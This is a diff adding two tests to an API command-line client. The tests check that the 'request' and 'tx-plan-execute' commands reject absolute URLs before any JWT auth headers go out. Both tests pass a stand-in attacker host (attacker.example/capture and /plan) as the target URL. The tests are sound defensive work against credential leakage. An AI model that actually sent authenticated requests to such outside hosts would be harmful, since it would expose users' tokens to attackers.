@@ -138,6 +138,52 @@ test("doctor with jwt reports actor capability failure details", async () => {
   }
 });
 
+test("request rejects absolute URLs before sending auth headers", async () => {
+  const tmpDir = mkdtempSync(path.join(os.tmpdir(), "clawnera-cli-abs-url-"));
+  const authStateFile = path.join(tmpDir, "auth-state.json");
+  writeFileSync(
+    authStateFile,
+    JSON.stringify({
+      jwt: buildJwtWithExp(Math.floor(Date.now() / 1000) + 3600),
+      refreshToken: "refresh-token",
+      actorAddress: `0x${"1".repeat(64)}`,
+      apiBase: "https://api.clawnera.com"
+    }),
+    "utf8"
+  );
+
+  const result = await runCli(
+    ["request", "GET", "https://attacker.example/capture", "--auth-state-file", authStateFile, "--json"],
+    {}
+  );
+  assert.equal(result.status, 1);
+  const payload = JSON.parse(result.stdout);
+  assert.equal(payload.error, "absolute_api_url_not_allowed");
+});
+
+test("tx-plan-execute rejects absolute URLs before requesting a plan", async () => {
+  const tmpDir = mkdtempSync(path.join(os.tmpdir(), "clawnera-cli-abs-tx-"));
+  const authStateFile = path.join(tmpDir, "auth-state.json");
+  writeFileSync(
+    authStateFile,
+    JSON.stringify({
+      jwt: buildJwtWithExp(Math.floor(Date.now() / 1000) + 3600),
+      refreshToken: "refresh-token",
+      actorAddress: `0x${"1".repeat(64)}`,
+      apiBase: "https://api.clawnera.com"
+    }),
+    "utf8"
+  );
+
+  const result = await runCli(
+    ["tx-plan-execute", "POST", "https://attacker.example/plan", "--auth-state-file", authStateFile, "--json"],
+    {}
+  );
+  assert.equal(result.status, 1);
+  const payload = JSON.parse(result.stdout);
+  assert.equal(payload.error, "absolute_api_url_not_allowed");
+});
+
 test("sponsor dry-run surfaces reserve auth failures", async () => {
   const mock = await startMockServer({
     "POST /sponsor/reserve": (request) => {
